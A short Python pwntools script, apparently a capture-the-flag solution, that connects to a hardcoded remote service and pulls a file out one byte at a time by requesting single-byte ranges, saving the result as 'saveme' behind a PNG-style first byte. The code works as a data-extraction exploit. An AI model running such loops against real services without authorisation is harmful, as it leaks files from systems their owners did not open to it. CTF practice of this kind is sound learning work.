from pwn import *

context.log_level = "CRITICAL"

host, port = ("34.107.72.222",31488)

def get_bytes(start):
	end = start + 1
	r = remote(host,port)
	r.recvuntil(": ")
	r.sendline(str(start).encode())
	r.recvuntil(": ")
	r.sendline(str(end).encode())
	r.recvuntil(str(end).encode() + b'\r\n')
	file = r.recvuntil("Enter")
	r.close()
	file = file[1:-7]
	if len(file) == 1:
		return file
	else:
		if file == b'\r\n':
			return b'\n'
		else:
			print('You can stop the program now')
			return b'\x00'


p = 0
f = open("saveme", "wb")
f.write(b'\x89')
while True:
	new_bytes = get_bytes(p + 1)
	f.write(new_bytes)
	f.flush()
	p = p + 1 #len(new_bytes)
	print(new_bytes)